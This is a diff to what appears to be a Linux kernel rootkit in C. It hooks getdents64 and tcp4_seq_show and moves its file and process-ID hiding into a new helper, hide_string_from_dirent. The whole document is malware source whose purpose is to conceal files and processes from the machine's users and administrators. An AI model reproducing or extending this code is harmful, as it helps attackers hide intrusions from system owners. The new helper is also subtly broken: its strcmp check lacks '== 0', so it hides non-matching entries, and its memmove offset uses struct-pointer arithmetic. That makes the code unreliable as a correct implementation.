@@ -35,6 +35,7 @@ static asmlinkage int (*old_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v);
 
 
+int hide_string_from_dirent(struct linux_dirent64* dirent, char* string, int len);
 
 
 
@@ -162,8 +163,8 @@ the implementation came out clunky and full of boilerplate- sorry, I need to wor
 static asmlinkage int new_getdents64(const struct pt_regs *regs)
 {
 	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
-	unsigned int len;
-	unsigned long index = 0;
+	int len;
+	unsigned long offset = 0;
 	long error;
 
 
@@ -199,42 +200,19 @@ static asmlinkage int new_getdents64(const struct pt_regs *regs)
 		goto done;
 	
 
-	curr_ent = (void*)dirent_kern + index;
+	curr_ent = (void*)dirent_kern + offset;
 	prev_ent = curr_ent;
 
-	while (index < len)
+
+	prev_ent = curr_ent;
+	curr_ent = (void*)dirent_kern + offset;
+	if (hide_file)
 	{
-		prev_ent = curr_ent;
-		curr_ent = (void*)dirent_kern + index;
-		if (hide_file)
-		{
-			if (strcmp(file_to_hide, curr_ent->d_name) == 0){
-				if (index == 0 )// special case
-				{
-					len -= curr_ent->d_reclen;
-					memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
-				}
-				else
-				{
-					prev_ent->d_reclen += curr_ent->d_reclen;
-				}
-			}
-		}
-		if (hide_pid)
-		{
-			if (strcmp(pid_to_hide, curr_ent->d_name) == 0){
-				if (index == 0 )// special case
-				{
-					len -= curr_ent->d_reclen;
-					memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
-				}
-				else
-				{
-					prev_ent->d_reclen += curr_ent->d_reclen;
-				}
-			}
-		}
-		index += curr_ent->d_reclen;
+		len = hide_string_from_dirent(dirent_kern, file_to_hide, len);
+	}
+	if (hide_pid)
+	{
+		len = hide_string_from_dirent(dirent_kern, pid_to_hide, len);
 	}
 
 		
@@ -247,6 +225,39 @@ static asmlinkage int new_getdents64(const struct pt_regs *regs)
 		return len;
 	
 	
+}
+
+int hide_string_from_dirent(struct linux_dirent64* dirent, char* string, int len)
+{
+	struct linux_dirent64  *curr_ent = NULL, *prev_ent = NULL; 
+
+	int new_len = len;	
+	unsigned int offset = 0;
+
+	curr_ent = (void*)dirent;
+	prev_ent = curr_ent;
+
+	while (offset < new_len)
+	{
+		prev_ent = curr_ent;
+		curr_ent = (void*)dirent + offset;
+		if (strcmp(string,curr_ent->d_name))
+		{	
+			if (offset == 0 )// special case
+			{
+				new_len -= curr_ent->d_reclen;
+				memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
+			}
+			else
+			{
+				prev_ent->d_reclen += curr_ent->d_reclen;
+			}
+		
+		}
+		
+		offset += curr_ent->d_reclen;
+	}
+	return new_len;
 }
 
 
